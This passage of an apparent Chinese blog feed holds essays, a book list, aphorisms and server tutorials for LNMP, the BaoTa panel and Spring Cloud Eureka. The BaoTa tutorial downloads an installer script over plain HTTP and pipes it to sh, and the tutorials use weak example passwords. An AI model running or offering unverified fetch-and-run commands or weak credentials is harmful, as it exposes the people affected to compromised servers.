的。</code></p></li><li><p><code>三千年读史，不外功名利禄；九万里悟道，终归诗酒田园。  ——《易经》</code></p></li><li><p><code>男人的气质，临危而不惧，途穷而志存；苦难能自立，责任揽自身；怨恨能德报，美丑辩分明；名利甘居后，为理愿驰骋；仁厚纳知己，开明扩胸襟；当机能立断，遇乱能慎行；忍辱能负重，坚忍能守恒；临弱可落泪，对恶敢拼争；功高不自傲，事后常反省；举止终如一，立言必有行。人生最高境界：佛为心，道为骨，儒为表，大度看世界。技在手，能在身，思在脑，从容过生活。三千年读史，不外功名利禄；九万里悟道，终归诗酒田园。</code></p></li><li><p><code>什么叫作魔境界？就是求快乐、求享受、求快感。—— 《易经》</code></p></li><li><p><code>光读正面的历史是不够的，还要看小说。所谓历史，常常人名、地名、时间都是真的，内容不太靠得住；而小说，是人名、地点、时间都是假的，但那个故事却往往是真的。</code></p></li><li><p><code>这是最好的时代，也是最坏的时代。西方文化的贡献，促进了物质文明的发达，这在表面上来看，可以说是幸福；坏，是指人们为了生存的竞争而忙碌，为了战争的毁灭而惶恐，为了欲海的难填而烦恼。在精神上，是最痛苦的。在这物质文明发达和精神生活贫乏的尖锐对比下，人类正面临着一个新的危机。</code></p></li><li><p><code>老实说吧，没有什么脑袋好不好的，是肯用心与不肯用心之故。你把我这句话仔细研究，聪明的人一听就会，就记住了，我笨，我多念一百遍，也成功了。所以“勤能补拙”这四个字要记住。</code></p></li><li><p><code>人有三个基本错误是不能犯的：一是德薄而位尊，二是智小而谋大，三是力小而任重。</code></p></li><li><p><code>夫妇本是前缘，善缘、恶缘，无缘不合。儿女原是宿债，欠债、还债，有债方来。</code></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 经典语录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 搭建 LNMP 环境</title>
      <link href="2020/02/17/linux-da-jian-lnmp-huan-jing/"/>
      <url>2020/02/17/linux-da-jian-lnmp-huan-jing/</url>
      
        <content type="html"><![CDATA[<p>本教程以 Ubuntu 16.04 操作系统为例讲解如何搭建 LNMP 环境。</p><p>1.在操作系统安装完毕后你需要更新下系统，执行</p><pre><code>sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade</code></pre><p>安装 screen</p><p>screen 可以创建一个后台会话，将任务放在后台执行，非常适合比如编译软件、编译内核、安装更新等任务。</p><p>1.安装</p><pre><code>sudo apt-get install screen</code></pre><p>2.创建一个会话</p><pre><code>screen -S lnmp</code></pre><p>下载 LNMP 安装包</p><p>可以<a href="https://lnmp.org/download.html" target="_blank" rel="noopener">去这里</a> 下载最新的 lnmp</p><p>安装包进行编译安装，或直接在命令行执行如下命令</p><pre><code>wget -c http://soft.vpser.net/lnmp/lnmp1.4-full.tar.gztar zxvf lnmp1.4-full.tar.gzcd lnmp1.4-full./install</code></pre><p>执行上面的命令后按照要求输入数据库密码、选择数据库的类型(提供 mysql 和 mariadb ) 以及 PHP 的版本即可进行编译安装。</p><pre><code>root@centos:~/lnmp1.4-full# ./install.sh+------------------------------------------------------------------------+|          LNMP V1.4 for Ubuntu Linux Server, Written by Licess          |+------------------------------------------------------------------------+|        A tool to auto-compile &amp; install LNMP/LNMPA/LAMP on Linux       |+------------------------------------------------------------------------+|           For more information please visit https://lnmp.org           |+------------------------------------------------------------------------+You have 5 options for your DataBase install.1: Install MySQL 5.1.732: Install MySQL 5.5.56 (Default)3: Install MySQL 5.6.364: Install MySQL 5.7.185: Install MariaDB 5.5.566: Install MariaDB 10.0.307: Install MariaDB 10.1.230: DO NOT Install MySQL/MariaDBEnter your choice (1, 2, 3, 4, 5, 6, 7 or 0): 7 # 选择数据库，部分版本的数据库需要内存大于2GYou will install MariaDB 10.1.23===========================Please setup root password of MySQL.(Default password: root) # 设置mysql root 密码Please enter: 123456@#MySQL root password: 123456@#===========================Do you want to enable or disable the InnoDB Storage Engine? # 是否安装 InnoDB 引擎Default enable,Enter your choice [Y/n]: yYou will enable the InnoDB Storage Engine===========================You have 6 options for your PHP install. # 选择 PHP 版本1: Install PHP 5.2.172: Install PHP 5.3.293: Install PHP 5.4.454: Install PHP 5.5.38 (Default)5: Install PHP 5.6.316: Install PHP 7.0.217: Install PHP 7.1.7Enter your choice (1, 2, 3, 4, 5, 6 or 7): 7You will install PHP 7.1.7===========================You have 3 options for your Memory Allocator install.1: Don&#39;t install Memory Allocator. (Default)2: Install Jemalloc3: Install TCMallocEnter your choice (1, 2 or 3): 2You will install JeMallocPress any key to install...or Press Ctrl+c to cancel # 按任意键继续安装</code></pre><p>在安装过程中如果你开启了 screen 则可以关闭会话，编译大约需要30分钟左右，如希望查看安装进度，可以再次连接服务器，执行</p><pre><code>screen -r lnmp</code></pre><p>查看该会话。</p><p>安装完毕会提示类似如下的信息</p><pre><code>State      Recv-Q Send-Q Local Address:Port               Peer Address:PortLISTEN     0      128          *:80                       *:*LISTEN     0      128          *:22                       *:*LISTEN     0      128         :::22                      :::*LISTEN     0      128         :::3306                    :::*Install lnmp takes 59 minutes.Install lnmp V1.4 completed! enjoy it.</code></pre><p>程序会自动开放80 3306端口</p>]]></content>
      
      
      
        <tags>
            
            <tag> 服务器环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019总结</title>
      <link href="2019/12/30/2019-zong-jie/"/>
      <url>2019/12/30/2019-zong-jie/</url>
      
        <content type="html"><![CDATA[<p><img src="https://note.youdao.com/yws/public/resource/634e73a4b1678da03a11a7867217a79f/xmlnote/FF2A2CFF3B244F76BB67EFE3F8EFAF0A/4572" alt></p><h3 id="1-总体感受"><a href="#1-总体感受" class="headerlink" title="1. 总体感受"></a>1. 总体感受</h3><p>又到年终，在 2019 年最后一天，回顾今年，仿佛是转眼之间的事。时间像是有加速度，过得越来越快。无法追赶时间，只能写下年终总结，记录今年的痕迹。今年总体来说过得比较平稳，在日常的生活和学习中，开始注重知识、技能的沉淀。有通过读书学习的输入，也有通过 Blog 作为知识的输出。对人生、工作、管理、技术有了更多的思考。</p><pre><code>今年的关键词：平稳，沉淀，输出。</code></pre><h3 id="2-成果与感悟"><a href="#2-成果与感悟" class="headerlink" title="2. 成果与感悟"></a>2. 成果与感悟</h3><p>今年主要划分为三个阶段，年初根据项目需要，进行数据集成平台开发， 技术进行博客编写。完成了大部分书籍的阅读。</p><h4 id="2-1-成果"><a href="#2-1-成果" class="headerlink" title="2.1 成果"></a>2.1 成果</h4><p>主要从两方面总结一下成果：</p><ul><li><p>学习输入</p><ul><li>阅读 10 本编程技术类书籍、15 本科普类书籍、8 本经管励志类书籍、17 本人文类书籍。对此，我写了一篇《2019 读过的好书推荐》进行总结。</li><li>对 Spring Boot 及 Spring Cloud 有更深入的使用和理解。</li><li>对开发规范，敏捷开发流程进行了学习与实践应用。</li></ul></li><li><p>技术输出</p><ul><li>开始用心经营自己的博客及公众号。并输出技术文章 30 篇，在各平台进行发布。</li><li>编写 spring boot 及 java 的相关开发技巧文章，同时也是自己使用过程中的总结</li><li>开源了自己的一个部署配置工具<h4 id="2-2-感悟"><a href="#2-2-感悟" class="headerlink" title="2.2 感悟"></a>2.2 感悟</h4>今年有做管理、也有开发，有学习，也有思考，同时有相应的输出，以下几点是我觉得值得记录的点：</li></ul></li><li><p><strong>费曼学习技巧-有效掌握知识</strong></p></li></ul><p>如何可以更好更快的掌握知识，费曼技巧是好办法，这是我一年来写 blog 得出的结论。以教促学，是学习一门知识的好办法。今年通过博客的形式，达到以教促学的效果，倒逼自己对知识点的系统学习，然后以自己的语言写在 blog 中，并通过示例代码的形式进行实践，加深知识的理解。这样，可以对知识点掌握得更牢固，理解得更深刻。</p><ul><li><strong>写作-自我进阶的高效方法</strong></li></ul><p>写作是自我进阶的高效方法，这是在看了粥左罗的《学会写作》得出的结论，结合自己的写 blog 体验，得到了很好的契合。确实如作者所说，写作是倒逼成长的绝佳方法，写作是学习效果的放大器，写作是个人能力的放大器，写作是重复销售自己的时间，写作是抗攻击性最强的技能。</p><p>进化-构建复杂系统的思维方法<br>进化的思维，是读了《生命是什么》和《从一到无穷大》之后的感悟。生命的形成从能量、物质到细胞膜、分工、感觉、学习等一步步进步而成为了复杂的生命体，而地球、太阳系、银河系、宇宙，从小到大，中子、电子、原子核到大爆炸理论，无一不是由小模块慢慢进化形成系统，进而形成复杂的系统。落实到计算机领域，同样也体现了这种进化的规律。最底层是 0 和 1 表示，进而是机器语言、高级语言，我们现在基于高级语言开发的软件系统就是这样而来。在软件系统开发中，也遵循着模块化，松耦合，高内聚的特征。复杂的系统不是一下子就开发出来的，而是在进化中形成。</p><ul><li><strong>规范-技术管理效率之道</strong></li></ul><p>在野蛮生长阶段，人少，沟通成本低，一切以功能实现为主要任务，往往无规范可言。但当人员多了之后，没有规范，就会产生明显的沟通成本高，流程不清晰、效率低下的情况，这个时候，规范化的软件开发流程，则是提高效率的必要手段。因此从开发工具、开发环境的统一、到软件模块划分、编码规范、版本管理规范，代码审核需要有统一规范。而与产品的沟通，则需要使用项目管理工具（例如禅道）把产品 、开发、测试、项目经理在统一的流程中进行，避免无效沟通和流程混乱，提高开发效率。</p><h3 id="3-明年展望"><a href="#3-明年展望" class="headerlink" title="3. 明年展望"></a>3. 明年展望</h3><pre><code>新的一年有新的期望。首先希望家人平安，健康，快乐。</code></pre><p>进一步培养自己对知识的输入，思考然后进行知识沉淀、输出的能力，在输出过程去完善自己的知识、语言、习惯体系，自己提供价值。继续坚持写 blog，形成系统化的知识。进一步学习与应用，在架构、大数据及人工智能方面有更深的理解。持续阅读学习与思考，更清晰地认知这个世界。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019好书推荐</title>
      <link href="2019/12/04/2019-hao-shu-tui-jian/"/>
      <url>2019/12/04/2019-hao-shu-tui-jian/</url>
      
        <content type="html"><![CDATA[<h3><font face="仿宋" size="6" color="green">1.引言</font></h3><p>2019 年即将过去，每年都会有个习惯把回顾一下读过的书，并把觉得比较好的书列成书单。今年也读了不少书，读的书比较杂，大部分是在微信读书上完成，有些书让人受益匪浅，下面是推荐列表，主要分几类，IT 技术类，科普知识类，经管励志类和人文社科类。</p><h3><font face="仿宋" size="6" color="green">2. 推荐书籍列表</font></h3><!--<font face="黑体">我是黑体字</font>--><!--<font face="仿宋">我是微软雅黑</font>--><!--<font face="STCAIYUN">我是华文彩云</font>--><!--<font color=#0099ff size=7 face="黑体">color=#0099ff size=72 face="黑体"</font>--><!--<font color=#00ffff size=72>color=#00ffff</font>--><!--<font color=gray size=72>color=gray</font>--><h3><font face="仿宋" size="4" color="green">2.1 IT 技术类</font></h3><h3><font face="仿宋" size="4" color="green">《深入浅出 Spring Boot 2.x》</font></h3><blockquote><ul><li>作者：杨开振，丰富 java<br>互联网开发经验的开发者，编写了多本 java 开发相关书籍</li><li>推荐理由：这是一本讲述如何使用 Spring Boot 2.x 进行编程开发的技术书籍，全书围绕 Spring Boot 进行讲解，并且提供编程示例，示例简单易懂，而且作者确实是有相当丰富的开发经验，文章语言流畅，既讲到编程技术也对其中的原理有较好的描述，让读者知其然也知其所以然。其中重点对 Spring MVC 的使用进行了大篇幅的讲解，比较透彻。通过此书，基本对 Spring Boot 的 Web 开发有了整体了解，作为入门级的 Spring Boot 学习书籍，值得一读。</li></ul></blockquote><h3><font face="仿宋" size="4" color="green">《面向程序员的数据挖掘指南》</font></h3><blockquote><ul><li>==作者：Ron Zacharski[1]==</li><li>推荐理由：这是一本开源书籍，用于学习基本的数据挖掘知识，强调实战，采用“边学边做”的方式编写，根据实例使用 python 脚本来学习数据挖掘技术，从而可以对推荐系统，过滤、相似度计算，分类，聚类，贝叶斯分类等知识有一定的了解。</li><li>书籍地址：<a href="https://dataminingguide.books.yourtion.com/" target="_blank" rel="noopener">https://dataminingguide.books.yourtion.com/</a></li></ul></blockquote><h3><font face="仿宋" size="4" color="green">《企业 IT 架构转型之道：阿里巴巴中台战略思想与架构实战》</font></h3><blockquote><ul><li>作者：钟华（花名：古谦），阿里巴巴中间件首席架构师</li><li>推荐理由：这本书从阿里巴巴启动中台战略说起，详细阐述共享服务体系如何给企业的业务发展提供了支持。对于中台战略，作者对抽取通用服务，共享服务，厚中台，瘦前端的思想，实际中遇到的问题及解决方案，进行了详细描述，有图，有技术思想，有案例，对企业的技术架构有比较好借鉴作用，特别是还处于烟囱式开发的 IT 企业。</li></ul></blockquote><h3><font face="仿宋" size="4" color="green">《Spring Batch 批处理框架》</font></h3><blockquote><ul><li>作者：刘相，普元软件 SOA 主任架构师</li><li>推荐理由：Spring Batch 是一个清晰、优雅的批处理框架，系统的中文资料较少，这本书属于少见的一本。书中全面、系统介绍了 Spring Batch 批处理框架，以实例的形式对 Spring Batch 基本组件进行介绍，通过这本书，可以理解 Spring Batch 的设计思想及基本使用。</li></ul></blockquote><h3><font face="仿宋" size="4" color="green">2.2 科普类</font></h3><h3><font face="仿宋" size="4" color="green">《文明之光》</font></h3><blockquote><ul><li>作者：吴军，计算机科学家，投资人，NLP 及搜索专家</li><li>推荐理由：吴军老师的书籍质量都很高，包括《浪潮之巅》《智能时代》《数学之美》《全球科技通史》，都是很值得一读，增长了多见识。文明之光以独特的视角讲述各时代文明，包括历史、政治、科技、艺术。语言通俗易懂，知识丰富有趣，收获良多。</li></ul></blockquote><h3><font face="仿宋" size="4" color="green">《生命是什么》</font></h3><blockquote><ul><li>作者：王立铭</li><li>推荐理由：书中围绕生命是什么为主题，从演化的角度描述生命的起源和发展。从灵魂论开始探索，然后描述能量，物质，自我复制是生命的基础，进而细胞膜，分工，感觉，学习，社交，自我意识，自由意志的演化发展，语言简洁易懂，很好的科普读物。个人觉得，这本书对读者的意义在于，一是知道我们从哪里来，开眼看世界。第二就是懂得用演化发展的眼光看事物。</li></ul></blockquote><p>==作者在一席上有一个演讲《星际远航中的生物学》[2]==</p><h3><font face="仿宋" size="4" color="green">《从一到无穷大》</font></h3><blockquote><ul><li>作者：乔治·伽莫夫</li><li>推荐理由：很好的科普书，涵盖了无穷数，时间与空间，微观世界的微粒子，宏观世界的太阳，星系，宇宙，与书名很相符，从一到无穷大。书中涉及的数学，物理，化学，生物知识，相对来讲已经是比较通俗的了。不过惭愧，还是有些地方没有理解，找时间得再读一遍。</li></ul></blockquote><h3><font face="仿宋" size="4" color="green">《物理大咖李淼作品集》</font></h3><p>包含：《三体中的物理学》，《给孩子讲时间简史》，《给孩子讲量子力学》，《给孩子讲宇宙》，《给孩子计相对论》</p><blockquote><ul><li>作者：李淼，中山大学天文与空间科学研究院院长。</li><li>推荐理由：李老师真的是深入浅出，书中讲述着物理学家的故事，结合现实的简单实例，把深奥的物理知识讲得通俗易懂。让人扩展知识，加深了对世界的认识！</li></ul></blockquote><h3><font face="仿宋" size="4" color="green">2.3 经管励志类</font></h3><h3><font face="仿宋" size="4" color="green">《软技能：代码之外生存指南》</font></h3><blockquote><ul><li>作者：John Z. Sonmez；王小刚（译）</li><li>推荐理由：这是一本真正从“人”（而非技术也非管理）的角度关注软件开发人员自身发展的书。从揭秘面试的流程到精耕细作出一份杀手级简历，从创建大受欢迎的博客到打造你的个人品牌，从提高自己工作效率到如何与“拖延症”做斗争，甚至包括如何投资不动产，如何关注自己的健康。其中，将自己当作一个企业来思考，给了我很大的触动。</li></ul></blockquote><h3><font face="仿宋" size="4" color="green">《斜杠青年：如何开启你的多重身份》</font></h3><blockquote><ul><li>作者：Susan Kuang，Linkedin 专栏作者，自媒体人。</li><li>推荐理由：不错的一本励志书，书中涵盖了很多主题，包括工作选择，效率，时间管理，积极心理，健康等等。作者主张按自己想要的方式去生活，去工作，而不必受外界影响。当然，前提是自己要有能力。跟《软技能》有异曲同工之妙，都提倡写作，逐渐形成自己的品牌，扩大影响力，吸纳粉丝，慢慢就可以实现自己的价值。</li></ul></blockquote><h3><font face="仿宋" size="4" color="green">《见识》</font></h3><blockquote><ul><li>作者：吴军，计算机科学家，投资人，NLP 及搜索专家</li><li>推荐理由：吴军老师认为，与其他外部资源或者个人因素相比，个人的成就首先取决于“见识”。书中提供一个与众不同的、值得深度思考的看待世界、看待问题的视角。内容是作者在得到的音频课程中的汇总整理，内容丰富，是个人成长，扩展知识面的好书。</li></ul></blockquote><h3><font face="仿宋" size="4" color="green">《程序员的成长课》</font></h3><blockquote><ul><li>作者：安晓辉，资深开发者,拥有十余年开发与管理经验</li><li>推荐理由：作者以过来人的身份，娓娓道来，围绕程序员的成长，从技术方向选择，技术精进，技术管理，转型，跳槽，简历，薪水等方面进行详细描述，同时提供了可行的执行方法。建议程序员都应该读一下。</li></ul></blockquote><h3><font face="仿宋" size="4" color="green">《学会写作：自我进阶的高效方法》</font></h3><blockquote><ul><li>作者：粥左罗，90 后，知名公众号“粥左罗”创始人，向上生长创始人，三年写作 300 万字。</li><li>推荐理由：作者的经验之谈，对写作做了全面分析，从写作目的作用，选题，写标题，结构，素材到传播，变现，语言精辟，结构清晰，学到东西。写作技巧没有捷径，要多写多练，结合作者的建议实践，才能不断进步。</li></ul></blockquote><h3><font face="仿宋" size="4" color="green">2.4 人文社科类</font></h3><h3><font face="仿宋" size="4" color="green">《变量》</font></h3><blockquote><ul><li>作者：何帆，经济学者，北京大学汇丰商学院教授，兼任熵一资本首席经济学家。</li><li>推荐理由：作者以细致的镜头把中国 2018 发生的故事描述的的很有深度。独特的写作风格，理性的经济分析，高超的概括总结能力，都显示何帆老师的功力。大变量，小趋势，希望中国越来越好！</li></ul></blockquote><h3><font face="仿宋" size="4" color="green">《今日简史》</font></h3><blockquote><ul><li>作者：尤瓦尔•赫拉利，畅销书《人类简史》《未来简史》作者，牛津大学历史学博士，耶路撒冷希伯来大学教授，全球瞩目的新锐历史学家。</li><li>推荐理由：“简史三部曲”收官之作《今日简史》推出，将目光聚焦到当下，直面今天关乎我们每个人命运的问题和挑战。人工智能和生物技术正在颠覆原有的社会结构和分配方式，数据成为最重要的资源。面对这些技术，关乎人类命运的种种议题，我们何去何从。写作手法很流畅，想象力丰富但又不失逻辑，看起来让人脑洞大开。</li></ul></blockquote><h3><font face="仿宋" size="4" color="green">《简读中国史:世界史坐标下的中国》</font></h3><blockquote><ul><li>作者：张宏杰，复旦大学历史学博士，清华大学博士后，现供职于中国人民大学历史学院。著有《曾国藩的正面与侧面》《大明王朝的七张面孔》《中国国民性演变历程》等。</li><li>推荐理由：以中国历史为主线，世界历史为比较对比资料，讲述了历史更替的影响因素（社会，文化，地理等等）。也刷新了我不少的历史认知，如大一统的秦朝的利与弊，为何如此短命；如鸦片战争，对中国卫生发展有着如此重要作用。书中用“长时间，远距离，宽视野”的解读方式，全方位呈现中国历史治乱循环背后的内在逻辑与外在动因。</li></ul></blockquote><h3><font face="仿宋" size="4" color="green">《重说中国近代史》</font></h3><blockquote><ul><li>作者：张鸣：中国人民大学政治学系教授、博士生导师，有多部中国历史著作。</li><li>推荐理由：书中把近代史，应该是晚清到五四运动的时期，看此书前，需要对这段历史的事件了解，书中描述的内容并不是对历史事件发生过程的描述，而是这些事件的另一面知识，比如原因，状态，花边。对于知识扩展还是有好处的</li></ul></blockquote><p>参考资料</p><p>[1]<br>Ron Zacharski: <a href="http://zacharski.org/" target="_blank" rel="noopener">http://zacharski.org/</a></p><p>[2]<br>《星际远航中的生物学》: <a href="https://yixi.tv/speech/218" target="_blank" rel="noopener">https://yixi.tv/speech/218</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人生三境界</title>
      <link href="2019/07/30/ren-sheng-san-jing-jie/"/>
      <url>2019/07/30/ren-sheng-san-jing-jie/</url>
      
        <content type="html"><![CDATA[<h3 id="治学三境界"><a href="#治学三境界" class="headerlink" title="治学三境界"></a>治学三境界</h3><p>​    [王国维]在《人间词话》中说：古今之成大事业、大学问者，必经过三种之境界： “昨夜西风凋碧树，独上高楼，望尽天涯路。” 此第一境也。 “ [衣带渐宽终不悔]，为伊消得人憔悴。” 此第二境也。 “ [众里寻他千百度]，[蓦然回首]，那人却在，[灯火阑珊处]。”此第三境也。</p><p>​    [王国维]在《[人间词话]》说：“古今之成大事业、大学问者，必经过三种之境界：‘昨夜西风凋碧树。独上高楼，望尽天涯路’。此第一境也。‘[衣带渐宽终不悔]，为伊消得人憔悴。’此第二境也。‘[众里寻他千百度]，蓦然回首，那人却在，灯火阑珊处’。此第三境也。”闲来无事，玩索大学问家之妙语，击节赞叹之余，心忽有所得：治学有三此境界，喝酒与灌水岂不亦有三此境界？试论之。 王国维认为治学第一境界：“昨夜西风凋碧树。独上高楼，望尽天涯路”，这词句出[晏殊]的《[蝶恋花]》，原意是说，“我”上高楼眺望所见的更为[萧飒]的秋景，西风黄叶，山阔水长，案书[何达]？在王国维此句中解成，做学问成大事业者，首先要有执着的追求，登高望远，瞰察路径，明确目标与方向，了解事物的概貌。这自然是借题发挥，以小见大。那如果按[原词]解，这几句是情感堆积、蕴酿期，是对下文“望尽天涯路”一种铺垫。</p><p>​    [王国维]认为治学第二境界是说：“衣带渐宽终不悔，为伊消得人憔悴。”这引用的是北宋[柳永]《凤栖梧》又名《蝶恋花》最后两句词，原词是表现作者对爱的艰辛和爱的无悔。若把“伊”字理解为词人所追求的理想和毕生从事的事业，亦无不可。王国维则别有用心，以此两句来比喻成大事业、大学问者，不是轻而易举，随便可得的，必须坚定不移，经过一番辛勤劳动，废寝忘食，孜孜以求，直至人瘦带宽也不后悔。这当然又是王国维的高明之处。</p><p>​    王国维认为治学第三境界是说：“众里寻他千百度，蓦然回首，那人却在，灯火阑珊处。”是引用南宋[辛弃疾]《青玉案·元夕》词中的最后四句。)称此词“自怜幽独，伤心人别有怀抱”。这是借词喻事，与文学赏析已无交涉。[王国维]已先自表明，“吾人可以无劳纠葛”。他以此词最后的四句为“境界”之第三，即最终最高境界。这虽不是辛弃疾的原意，但也可以引出悠悠的远意，做学问、成大事业者，要达到第三境界，必须有专注的精神，反复追寻、研究，下足功夫，自然会豁然贯通，有所发现，有所发明，就能够从[必然王国]进入[自由王国]。能引伸这个方面来，王国维的高明自为必说。</p><h2 id="三境界"><a href="#三境界" class="headerlink" title="三境界"></a>三境界</h2><h3 id="第一境界"><a href="#第一境界" class="headerlink" title="第一境界"></a>第一境界</h3><p>“昨夜西风凋碧树，独上高楼，望尽天涯路。”</p><p>（1） 萧瑟的秋风中，游子登高望远，怀念亲人，见不到又音信难通，就如一名学者刚开始在学问时那种对知识的惆怅迷惘的心情跃然纸上。</p><p>（2） 作为一个做学问者，首先要高瞻远瞩认清前人所走的路，也就是说，总结和学习前人的经验是做学问的起点。</p><p>此句选自——宋·[晏殊]【蝶恋花】槛菊愁烟兰泣露。罗幕轻寒，燕子双飞去。[明月])不谙别离苦，斜光到晓穿[朱户]。 昨夜西风凋碧树。独上高楼，望尽天涯路。欲寄彩笺兼尺素，山长水阔知何处。</p><h3 id="第二境界"><a href="#第二境界" class="headerlink" title="第二境界"></a>第二境界</h3><p>“衣带渐宽终不悔，为伊消得人憔悴。”</p><p>（1）沉溺于热恋中的情人对爱情的执着，人消瘦了，但决不后悔。就如学者在追求知识的过程中所表现出一种认定了目标就呕心沥血孜孜以求的执着精神。</p><p>（2）作为一名做学问者，应深思熟虑，就像热恋中的情人那样热切、不惜一切的追求自己的目标。</p><p>此句选自——宋·[柳永]【凤栖梧】伫倚危楼风细细。望极春愁，黯黯生天际。草色烟光残照里。无言谁会凭栏意。 拟把疏狂图一醉，[对酒当歌]，强乐还无味。衣带渐宽终不悔，为伊消得人憔悴。</p><h3 id="第三境界"><a href="#第三境界" class="headerlink" title="第三境界"></a>第三境界</h3><p>“众里寻他千百度，蓦然回首，那人却在灯火阑珊处。”</p><p>（1） 没有千百度的上下求索，不会有瞬间的顿悟和理解。</p><p>（2） 作为一个做学问者，只有在学习和苦苦钻研的基础上，才能够[功到自然成]，一朝顿悟，发前人所未发之秘，辟前人所未辟之境。</p><p>此句选自——宋·[辛弃疾]【青玉案】东风夜放花千树。更吹落、星如雨。[宝马雕车])香满路，凤箫声动，玉壶光转，一夜鱼龙舞。 [蛾儿])雪柳黄金缕。笑语盈盈暗香去。众里寻它千百度。蓦然回首，那人却在，灯火阑珊处。</p>]]></content>
      
      
      <categories>
          
          <category> 名言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 名言 </tag>
            
            <tag> 感悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS安装宝塔</title>
      <link href="2019/06/24/centos-an-zhuang-bao-ta/"/>
      <url>2019/06/24/centos-an-zhuang-bao-ta/</url>
      
        <content type="html"><![CDATA[<p>1.安装可视化面板</p><pre><code>yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install.sh &amp;&amp; sh install.sh</code></pre><p>注意：代码没有换行！如出错，尝试在下面复制，或先复制到记事本删除换行再粘贴到终端。<br>yum install -y wget &amp;&amp; wget -O install.sh <a href="http://download.bt.cn/install/install.sh" target="_blank" rel="noopener">http://download.bt.cn/install/install.sh</a> &amp;&amp; sh install.sh</p><p>输入命令后，系统自动下载安装环境，然后输入 y 进行确认。 然后等待约1-5分钟<br><img src="https://note.youdao.com/yws/public/resource/a7b28e89afc8e429d20c7293f6faa483/xmlnote/3FBD6FCD15154A6D8151658F4868B63E/4485" alt><br>如无意外，最后会出现如下类似内容</p><pre><code>Bt-Panel: http://111.230.15.237:8888username: *******password: *******Warning:If you cannot access the panel,release the following port (8888|888|80|443|20|21) in the security group</code></pre><p>系统自动生成账号密码，<br>username 项为账号，<br>pwssword 为密码。<br>请保存好你的账号密码。</p><p>2.启动面板与管理</p><ul><li>启动面板</li></ul><p>控制面板支持：</p><p>一键配置服务器环境（ LAMP / LNMP ）</p><p>一键安全重启</p><p>一键创建管理网站、ftp、数据库</p><p>一键配置（定期备份、数据导入、伪静态、301、SSL、子目录、反向代理、切换 PHP 版本）</p><p>数据库一键导入导出</p><p>系统监控（ CPU、内存、磁盘IO、网络IO ）</p><p>防火墙端口放行</p><p>SSH 开启与关闭及 SSH 端口更改<br>…</p><p>请复制以下命令到终端 ,然后稍等</p><pre><code>service bt restart</code></pre><ul><li>访问面板<br>控制面板地址端口为 8888 ，<br>你的控制面板地址为 <a href="http://123.207.230.231:8888" target="_blank" rel="noopener">http://123.207.230.231:8888</a></li></ul><p>请复制链接到新窗口打开</p><ul><li>添加站点</li></ul><p>在控制面板中，点击左侧导航栏的 网站 一项，添加网站。 域名： 填你的ip 123.207.230.231<br>备注： test<br>根目录：/www/wwwroot/test<br>FTP 、 数据库 两项中，账号密码都填 test<br>点击 提交 即可</p>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> 宝塔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java分布式的创建</title>
      <link href="2019/04/08/java-fen-bu-shi-de-chuang-jian/"/>
      <url>2019/04/08/java-fen-bu-shi-de-chuang-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="注册中心的创建"><a href="#注册中心的创建" class="headerlink" title="注册中心的创建"></a>注册中心的创建</h2><p>1、建立注册中心(EurekaServer)，需要引入依赖。<br>Spring Cloud Discovery –&gt; Eureka Server</p><p>2、在项目src–&gt;main–&gt;java–&gt;com.XXX.XXXXX–&gt;找到EurekaServerApplication(项目名字+Application)<br>中的类方法上加@EnableEurekaServer注解。</p><p>3、找到项目中的application.properties，在其中加入以下语句：</p><pre><code>#端口号设置server.port=8080#注册中心服务记录地址eureka.client.service-url.defaultZone=http://localhost:8080/eureka#记录注册信息(记名字)eureka.client.fetch-registry=false#服务注册到注册中心eureka.client.register-with-eureka=false#端口号设置server.port=8080#注册中心服务记录地址eureka.client.service-url.defaultZone=http://localhost:8080/eureka#记录注册信息(记名字)eureka.client.fetch-registry=false#服务注册到注册中心eureka.client.register-with-eureka=false</code></pre><h2 id="注册中心创建完毕"><a href="#注册中心创建完毕" class="headerlink" title="注册中心创建完毕"></a>注册中心创建完毕</h2><p><strong>生产者的建立</strong></p><p>1、建立生产者(producer),需要引入依赖。<br>Web–&gt; Spring Web<br>SQL–&gt; JDBC API , MyBatis Framework , MySQL Driver<br>Spring Cloud Discovery–&gt; Eureka Discovery Client</p><p>2、在项目src–&gt;main–&gt;java–&gt;com.XXX.XXXXX–&gt;找到MyproviderApplication(项目名字+Application)<br>在类方法上加@EnableEurekaClient注解</p><p>3、找到项目中的application.properties，在其中加入以下语句：</p><pre><code>#设置端口号server.port=8081# 数据库连接属性spring.datasource.username=rootspring.datasource.password=rootspring.datasource.url=jdbc:mysql://localhost:3306/test(数据库名字)?serverTimezone=UTC(时区)spring.datasource.driver-class-name=com.mysql.jdbc.Driver# 给实体类起别名mybatis.type-aliases-package=com.example.demo.bean# 扫描mapper文件mybatis.mapper-locations=classpath:mapper/*.xml#给项目起名字spring.application.name=myprovider#注册项目eureka.client.service-url.defaultZone=http://localhost:8080/eureka</code></pre><p>PS：如需一个对象为参数则需要@RequestBody注解，如果是其他数据类型则需要添加@RequestParam(“XXX”)注解，</p><p>PS:XXX就是参数的名字</p><h2 id="消费者的建立"><a href="#消费者的建立" class="headerlink" title="消费者的建立"></a>消费者的建立</h2><p>1、建立消费者(consumer),需要引入依赖。<br>Web–&gt; Spring Web<br>Template Engines–&gt; Thymeleaf<br>Spring Cloud Discovery–&gt; Eureka Discovery Client<br>Spring Cloud 